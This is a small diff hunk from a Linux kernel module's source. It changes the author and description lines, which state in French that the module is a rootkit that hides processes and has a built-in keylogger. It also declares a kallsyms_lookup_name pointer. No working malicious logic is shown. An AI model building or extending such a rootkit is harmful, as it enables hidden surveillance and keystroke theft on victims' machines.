@@ -12,8 +12,8 @@
 #include <linux/input.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Your Name");
-MODULE_DESCRIPTION("A simple rootkit that hides processes and logs keystrokes");
+MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez");
+MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré");
 
 // Déclaration de kallsyms_lookup_name
 static unsigned long (*kallsyms_lookup_name)(const char *name);
